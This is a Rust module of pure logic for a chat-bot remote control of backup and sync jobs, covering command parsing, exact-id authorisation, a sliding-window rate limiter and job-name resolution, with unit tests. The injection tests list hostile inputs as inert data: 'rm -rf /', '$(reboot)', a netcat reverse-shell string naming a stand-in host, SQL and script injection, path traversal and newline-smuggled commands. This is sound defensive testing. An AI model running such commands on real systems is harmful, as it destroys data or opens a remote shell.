//! The pure parts of chat-bot remote control: what a message may ask for,
//! who may ask, how often, and which job a name means. No network, no
//! engines, no clock of its own: everything here is a function of its
//! arguments, so the security-relevant rules are tested exhaustively.
//!
//! The command set is fixed (`/jobs`, `/run <job>`, `/stop <job>`,
//! `/status`, `/help`). Nothing a sender types is ever run as a program or
//! shell command or interpreted as anything but a job name to look up.

use std::collections::{HashMap, HashSet, VecDeque};
use std::time::{Duration, Instant};

/// Longest job name a command may carry.
pub const MAX_JOB_QUERY: usize = 128;

/// Which chat service a message came from; they differ in how commands are typed.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Dialect {
    /// `/cmd`, possibly `/cmd@botname`.
    Telegram,
    /// Slack's client keeps `/…` for its own slash commands, so the command
    /// word is accepted with or without the slash, after an optional @mention.
    Slack,
}

/// What a message asks for.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Command {
    Help,
    Jobs,
    Status,
    Run(String),
    Stop(String),
}

impl Command {
    /// A normalised one-line form for the audit log: the verb and, for
    /// run/stop, the (already sanitised) job name.
    pub fn audit_text(&self) -> String {
        match self {
            Command::Help => "help".into(),
            Command::Jobs => "jobs".into(),
            Command::Status => "status".into(),
            Command::Run(j) => format!("run {j}"),
            Command::Stop(j) => format!("stop {j}"),
        }
    }
}

/// The result of reading a message.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Parsed {
    /// Not addressed to the bot (ordinary chat, another bot's command).
    Ignore,
    Command(Command),
    /// A command word the bot does not have (the sender is told).
    Unknown(String),
    /// A known command used wrongly; carries the usage line.
    Usage(&'static str),
}

/// Remove control characters and cut to `max` characters, for echoing
/// untrusted text back to a chat.
pub fn sanitize_echo(s: &str, max: usize) -> String {
    let cleaned: String = s.chars().filter(|c| !c.is_control()).collect();
    if cleaned.chars().count() > max {
        let cut: String = cleaned.chars().take(max).collect();
        format!("{cut}…")
    } else {
        cleaned
    }
}

/// Read one message. `bot_name` (without `@`) is the bot's own handle, used
/// to recognise `/cmd@thisbot` and to leave `/cmd@otherbot` alone.
pub fn parse(text: &str, dialect: Dialect, bot_name: Option<&str>) -> Parsed {
    let mut t = text.trim();
    if dialect == Dialect::Slack {
        // A leading mention (`<@U123> run x`) addresses the bot.
        if let Some(rest) = t.strip_prefix("<@") {
            match rest.split_once('>') {
                Some((_, after)) => t = after.trim_start(),
                None => return Parsed::Ignore,
            }
        }
    }
    let had_slash = t.starts_with('/');
    if dialect == Dialect::Telegram && !had_slash {
        return Parsed::Ignore;
    }
    let body = t.strip_prefix('/').unwrap_or(t);
    let (word, rest) = match body.split_once(char::is_whitespace) {
        Some((w, r)) => (w, r.trim()),
        None => (body, ""),
    };
    if word.is_empty() {
        return Parsed::Ignore;
    }
    let (verb, addressed_to) = match word.split_once('@') {
        Some((v, who)) => (v, Some(who)),
        None => (word, None),
    };
    if let (Some(who), Some(me)) = (addressed_to, bot_name) {
        if !who.eq_ignore_ascii_case(me) {
            return Parsed::Ignore;
        }
    }
    let verb = verb.to_ascii_lowercase();
    if verb.is_empty() {
        return Parsed::Ignore;
    }
    // On Slack a bare word is only a command if it is one of ours; anything
    // else is conversation the bot has no business answering.
    let known = matches!(verb.as_str(), "help" | "start" | "jobs" | "status" | "run" | "stop");
    if !known {
        return if had_slash || dialect == Dialect::Telegram { Parsed::Unknown(sanitize_echo(&verb, 32)) } else { Parsed::Ignore };
    }
    match verb.as_str() {
        "help" | "start" => Parsed::Command(Command::Help),
        "jobs" => Parsed::Command(Command::Jobs),
        "status" => Parsed::Command(Command::Status),
        "run" | "stop" => {
            let usage = if verb == "run" { "Usage: /run <job name>" } else { "Usage: /stop <job name>" };
            if rest.is_empty() {
                return Parsed::Usage(usage);
            }
            // One line, printable, bounded: a job name is looked up, never interpreted.
            if rest.chars().count() > MAX_JOB_QUERY || rest.chars().any(char::is_control) {
                return Parsed::Usage("Job names are one line of at most 128 characters");
            }
            Parsed::Command(if verb == "run" { Command::Run(rest.to_string()) } else { Command::Stop(rest.to_string()) })
        }
        _ => Parsed::Ignore,
    }
}

/// Who may command the bot: exactly the listed ids, compared as whole
/// strings. No patterns, no wildcards, no "everyone"; an empty list allows
/// nobody.
#[derive(Debug, Clone, Default)]
pub struct Authorizer {
    allowed: HashSet<String>,
}

impl Authorizer {
    pub fn new<I: IntoIterator<Item = S>, S: AsRef<str>>(ids: I) -> Self {
        Self { allowed: ids.into_iter().map(|i| i.as_ref().trim().to_string()).filter(|i| !i.is_empty()).collect() }
    }

    pub fn is_empty(&self) -> bool {
        self.allowed.is_empty()
    }

    /// Whether `sender` (the id the chat service reports, not a name the
    /// sender chose) is on the list. Surrounding whitespace is not ignored.
    pub fn allows(&self, sender: &str) -> bool {
        !sender.is_empty() && self.allowed.contains(sender)
    }
}

/// Whether `id` is a plausible Telegram user id (digits, as the API reports them).
pub fn valid_telegram_id(id: &str) -> bool {
    !id.is_empty() && id.len() <= 20 && id.chars().all(|c| c.is_ascii_digit())
}

/// Whether `id` is a plausible Slack user id (`U…` or `W…`, upper-case letters and digits).
pub fn valid_slack_id(id: &str) -> bool {
    id.len() >= 3 && id.len() <= 20 && matches!(id.as_bytes()[0], b'U' | b'W') && id.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
}

/// How a rate-limited sender is treated.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Rate {
    Allowed,
    /// Over the limit; `notify` is true only for the first refusal in a window.
    Limited { notify: bool },
}

/// At most `max` commands per `window` per sender (sliding window).
#[derive(Debug)]
pub struct RateLimiter {
    max: usize,
    window: Duration,
    hits: HashMap<String, VecDeque<Instant>>,
    warned: HashMap<String, Instant>,
}

impl RateLimiter {
    pub fn new(max: usize, window: Duration) -> Self {
        Self { max: max.max(1), window, hits: HashMap::new(), warned: HashMap::new() }
    }

    pub fn check(&mut self, sender: &str, now: Instant) -> Rate {
        let q = self.hits.entry(sender.to_string()).or_default();
        while q.front().is_some_and(|t| now.duration_since(*t) >= self.window) {
            q.pop_front();
        }
        if q.len() < self.max {
            q.push_back(now);
            self.warned.remove(sender);
            return Rate::Allowed;
        }
        let notify = self.warned.get(sender).map_or(true, |w| now.duration_since(*w) >= self.window);
        if notify {
            self.warned.insert(sender.to_string(), now);
        }
        Rate::Limited { notify }
    }
}

/// What kind of job a name refers to.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum JobKind {
    Backup,
    Sync,
    Rule,
}

impl JobKind {
    pub fn label(self) -> &'static str {
        match self {
            JobKind::Backup => "backup",
            JobKind::Sync => "sync",
            JobKind::Rule => "rule",
        }
    }
}

/// A job the bot can list, run or stop.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct JobInfo {
    pub kind: JobKind,
    pub id: String,
    pub name: String,
    /// `idle`, `running`, `disabled`…
    pub state: String,
}

/// The outcome of looking a job name up.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Resolved {
    One(JobInfo),
    None,
    /// Several jobs share the name; the sender must say which kind.
    Ambiguous(Vec<JobInfo>),
}

/// Find the job `query` names: `backup:Name`, `sync:Name` or `rule:Name`
/// narrow it to a kind; otherwise an exact id or exact name (ignoring
/// case). Never a partial match: starting a job must be deliberate.
pub fn resolve(jobs: &[JobInfo], query: &str) -> Resolved {
    let q = query.trim();
    let (kind, name) = match q.split_once(':') {
        Some(("backup", n)) => (Some(JobKind::Backup), n.trim()),
        Some(("sync", n)) => (Some(JobKind::Sync), n.trim()),
        Some(("rule", n)) => (Some(JobKind::Rule), n.trim()),
        _ => (None, q),
    };
    let candidates = || jobs.iter().filter(|j| kind.map_or(true, |k| k == j.kind));
    let by_id: Vec<&JobInfo> = candidates().filter(|j| j.id == name).collect();
    let matches = if by_id.len() == 1 { by_id } else { candidates().filter(|j| j.name.eq_ignore_ascii_case(name) || j.name.to_lowercase() == name.to_lowercase()).collect() };
    match matches.len() {
        0 => Resolved::None,
        1 => Resolved::One(matches[0].clone()),
        _ => Resolved::Ambiguous(matches.into_iter().cloned().collect()),
    }
}

/// The help text.
pub fn help_text() -> String {
    "UFOP remote control\n\
     /jobs - list backups, sync pairs and automation rules\n\
     /run <job> - start a job\n\
     /stop <job> - stop a running job\n\
     /status - what is running\n\
     /help - this message\n\
     Name a job exactly; use backup:, sync: or rule: before the name when two kinds share one."
        .into()
}

/// `/jobs` as text: one line per job, grouped by kind.
pub fn render_jobs(jobs: &[JobInfo]) -> String {
    if jobs.is_empty() {
        return "No jobs are set up.".into();
    }
    let mut out = String::new();
    for kind in [JobKind::Backup, JobKind::Sync, JobKind::Rule] {
        let of_kind: Vec<&JobInfo> = jobs.iter().filter(|j| j.kind == kind).collect();
        if of_kind.is_empty() {
            continue;
        }
        out.push_str(match kind {
            JobKind::Backup => "Backups\n",
            JobKind::Sync => "Sync pairs\n",
            JobKind::Rule => "Automation rules\n",
        });
        for j in of_kind {
            out.push_str(&format!("- {} ({})\n", sanitize_echo(&j.name, 80), j.state));
        }
    }
    out.trim_end().to_string()
}

/// Replies are cut to this many characters (chat services cap messages).
pub const MAX_REPLY: usize = 3500;

/// Escape text for Slack, where `&`, `<` and `>` start control sequences
/// (`<!channel>` would notify everyone).
pub fn slack_escape(s: &str) -> String {
    s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tg(t: &str) -> Parsed {
        parse(t, Dialect::Telegram, Some("ufopbot"))
    }
    fn sl(t: &str) -> Parsed {
        parse(t, Dialect::Slack, None)
    }
    fn run(j: &str) -> Parsed {
        Parsed::Command(Command::Run(j.into()))
    }

    #[test]
    fn the_fixed_command_set() {
        assert_eq!(tg("/help"), Parsed::Command(Command::Help));
        assert_eq!(tg("/start"), Parsed::Command(Command::Help), "Telegram sends /start first");
        assert_eq!(tg("/jobs"), Parsed::Command(Command::Jobs));
        assert_eq!(tg("/status"), Parsed::Command(Command::Status));
        assert_eq!(tg("/run Nightly docs"), run("Nightly docs"));
        assert_eq!(tg("/stop Nightly docs"), Parsed::Command(Command::Stop("Nightly docs".into())));
        // Case of the verb and spacing do not matter; the job name's case is kept.
        assert_eq!(tg("  /RUN   Photos  "), run("Photos"));
        assert_eq!(tg("/Jobs extra words are ignored"), Parsed::Command(Command::Jobs));
    }

    #[test]
    fn usage_errors_unknown_commands_and_other_chatter() {
        assert!(matches!(tg("/run"), Parsed::Usage(u) if u.contains("/run")));
        assert!(matches!(tg("/stop   "), Parsed::Usage(u) if u.contains("/stop")));
        assert_eq!(tg("/shutdown"), Parsed::Unknown("shutdown".into()));
        assert_eq!(tg("/rm -rf /"), Parsed::Unknown("rm".into()));
        assert_eq!(tg("hello there"), Parsed::Ignore, "ordinary chat is not for the bot");
        assert_eq!(tg("run Photos"), Parsed::Ignore, "Telegram commands need the slash");
        assert_eq!(tg(""), Parsed::Ignore);
        assert_eq!(tg("/"), Parsed::Ignore);
        assert_eq!(tg("/@ufopbot"), Parsed::Ignore);
        // The echoed command word is bounded and printable.
        match tg(&format!("/{}", "x".repeat(500))) {
            Parsed::Unknown(w) => assert!(w.chars().count() <= 33),
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn commands_addressed_to_another_bot_are_left_alone() {
        assert_eq!(tg("/run@ufopbot Photos"), run("Photos"));
        assert_eq!(tg("/run@UFOPBOT Photos"), run("Photos"), "handles are case-insensitive");
        assert_eq!(tg("/run@otherbot Photos"), Parsed::Ignore);
        // Without knowing our own handle a suffix is accepted (it can only have come to us).
        assert_eq!(parse("/run@whoever Photos", Dialect::Telegram, None), run("Photos"));
    }

    #[test]
    fn injection_attempts_are_just_job_names_or_refused() {
        // Shell, SQL and template syntax stay inert text: they are looked up as names.
        for evil in ["Photos; rm -rf /", "$(reboot)", "`id`", "a && b", "x' OR '1'='1", "{{rule}}", "../../etc/passwd", "Photos | nc evil 1 -e sh", "<!channel>", "<script>alert(1)</script>"] {
            assert_eq!(tg(&format!("/run {evil}")), run(evil), "{evil}");
        }
        // Newlines (a second command smuggled on a following line) and other control characters are refused.
        assert!(matches!(tg("/run Photos\n/run Other"), Parsed::Usage(_)));
        assert!(matches!(tg("/run Photos\r\nstop"), Parsed::Usage(_)));
        assert!(matches!(tg("/run Pho\u{0}tos"), Parsed::Usage(_)));
        assert!(matches!(tg("/run Pho\u{7}tos"), Parsed::Usage(_)));
        // Over-long names are refused rather than truncated into something else.
        assert!(matches!(tg(&format!("/run {}", "a".repeat(129))), Parsed::Usage(_)));
        assert_eq!(tg(&format!("/run {}", "a".repeat(128))), run(&"a".repeat(128)));
        // Only the first word is the verb: "run" smuggled inside an argument does nothing.
        assert_eq!(tg("/jobs /run Photos"), Parsed::Command(Command::Jobs));
        // A homoglyph verb is not a command.
        assert_eq!(tg("/ruп Photos"), Parsed::Unknown("ruп".into()));
        // The audit line is one line whatever was typed (control characters cannot get in).
        assert!(!Command::Run("a b".into()).audit_text().contains('\n'));
    }

    #[test]
    fn slack_accepts_bare_words_and_mentions() {
        assert_eq!(sl("jobs"), Parsed::Command(Command::Jobs));
        assert_eq!(sl("run Photos"), run("Photos"));
        assert_eq!(sl("<@U0BOT> run Photos"), run("Photos"));
        assert_eq!(sl("<@U0BOT>   status"), Parsed::Command(Command::Status));
        assert_eq!(sl("/run Photos"), run("Photos"));
        // Conversation that is not a command is ignored, not answered.
        assert_eq!(sl("thanks, that worked"), Parsed::Ignore);
        assert_eq!(sl("running late today"), Parsed::Ignore, "only the exact word run counts");
        assert_eq!(sl("<@U0BOT> what can you do"), Parsed::Ignore);
        assert_eq!(sl("<@U0BOT"), Parsed::Ignore, "a broken mention");
        assert_eq!(sl("/danger"), Parsed::Unknown("danger".into()), "an explicit slash command we do not have");
    }

    #[test]
    fn only_listed_ids_are_authorised_exactly() {
        let a = Authorizer::new(["12345", " 777 ", ""]);
        assert!(a.allows("12345") && a.allows("777"));
        for stranger in ["", "1234", "123456", "12345 ", " 12345", "12345\n", "12345;", "0", "-12345", "12345 OR 1=1", "١٢٣٤٥", "*", "all", "everyone"] {
            assert!(!a.allows(stranger), "{stranger:?}");
        }
        // No list, no access; a wildcard entry is only a literal id nobody has.
        assert!(!Authorizer::new(Vec::<String>::new()).allows("12345"));
        assert!(Authorizer::new(Vec::<String>::new()).is_empty());
        let star = Authorizer::new(["*", ".*", "%"]);
        assert!(!star.allows("12345") && !star.allows("anything"));
        assert!(Authorizer::new(["U0ABC"]).allows("U0ABC") && !Authorizer::new(["U0ABC"]).allows("u0abc"), "Slack ids are case-sensitive");
    }

    #[test]
    fn id_formats() {
        assert!(valid_telegram_id("123456789") && valid_telegram_id("7"));
        for bad in ["", "-1001", "12a", "1 2", "12345678901234567890123", "٣"] {
            assert!(!valid_telegram_id(bad), "{bad}");
        }
        assert!(valid_slack_id("U0123ABCD") && valid_slack_id("W012A3CDE"));
        for bad in ["", "u0123", "B0123ABCD", "U0", "U01 23", "U0123;", "U0123abc"] {
            assert!(!valid_slack_id(bad), "{bad}");
        }
    }

    #[test]
    fn the_rate_limit_is_per_sender_and_slides() {
        let t0 = Instant::now();
        let mut r = RateLimiter::new(3, Duration::from_secs(60));
        let at = |s: u64| t0 + Duration::from_secs(s);
        assert_eq!([r.check("a", at(0)), r.check("a", at(1)), r.check("a", at(2))], [Rate::Allowed; 3]);
        assert_eq!(r.check("a", at(3)), Rate::Limited { notify: true }, "the first refusal is announced");
        assert_eq!(r.check("a", at(4)), Rate::Limited { notify: false }, "later ones are silent");
        assert_eq!(r.check("b", at(4)), Rate::Allowed, "another sender is unaffected");
        // The window slides: after the first hit ages out, one more is allowed.
        assert_eq!([r.check("a", at(60)), r.check("a", at(61)), r.check("a", at(62))], [Rate::Allowed; 3], "hits at 0, 1 and 2 have aged out one by one");
        assert!(matches!(r.check("a", at(63)), Rate::Limited { .. }));
        // A zero limit still allows one.
        assert_eq!(RateLimiter::new(0, Duration::from_secs(1)).check("x", t0), Rate::Allowed);
    }

    fn job(kind: JobKind, id: &str, name: &str) -> JobInfo {
        JobInfo { kind, id: id.into(), name: name.into(), state: "idle".into() }
    }

    #[test]
    fn job_names_resolve_exactly() {
        let jobs = vec![job(JobKind::Backup, "b1", "Photos"), job(JobKind::Sync, "s1", "Photos"), job(JobKind::Rule, "r1", "Tidy"), job(JobKind::Backup, "b2", "Docs")];
        assert!(matches!(resolve(&jobs, "Docs"), Resolved::One(j) if j.id == "b2"));
        assert!(matches!(resolve(&jobs, "docs"), Resolved::One(j) if j.id == "b2"), "case-insensitive");
        assert!(matches!(resolve(&jobs, "r1"), Resolved::One(j) if j.name == "Tidy"), "by id");
        assert!(matches!(resolve(&jobs, "Photos"), Resolved::Ambiguous(v) if v.len() == 2));
        assert!(matches!(resolve(&jobs, "sync:Photos"), Resolved::One(j) if j.id == "s1"));
        assert!(matches!(resolve(&jobs, "backup:photos"), Resolved::One(j) if j.id == "b1"));
        assert_eq!(resolve(&jobs, "rule:Photos"), Resolved::None, "the kind narrows the search");
        // No partial or fuzzy matches.
        for q in ["Pho", "Photo", "Tid", "", "%", ".*", "Docs; Tidy"] {
            let r = resolve(&jobs, q);
            assert!(matches!(r, Resolved::None) || matches!(&r, Resolved::One(j) if j.name == q.trim()), "{q:?}: {r:?}");
        }
        assert_eq!(resolve(&jobs, "Pho"), Resolved::None);
        assert_eq!(resolve(&[], "Docs"), Resolved::None);
        // Unknown kind prefixes are just part of a name that does not exist.
        assert_eq!(resolve(&jobs, "shell:Docs"), Resolved::None);
    }

    #[test]
    fn rendering() {
        assert_eq!(render_jobs(&[]), "No jobs are set up.");
        let out = render_jobs(&[job(JobKind::Rule, "r", "Tidy"), job(JobKind::Backup, "b", "Docs\n/run x")]);
        assert_eq!(out, "Backups\n- Docs/run x (idle)\nAutomation rules\n- Tidy (idle)", "control characters are removed from echoed names");
        assert!(help_text().contains("/run <job>"));
        assert_eq!(slack_escape("<!channel> & <@U1>"), "&lt;!channel&gt; &amp; &lt;@U1&gt;");
        assert_eq!(sanitize_echo("a\u{0}b\nc", 10), "abc");
        assert_eq!(sanitize_echo("abcdef", 3), "abc…");
    }
}
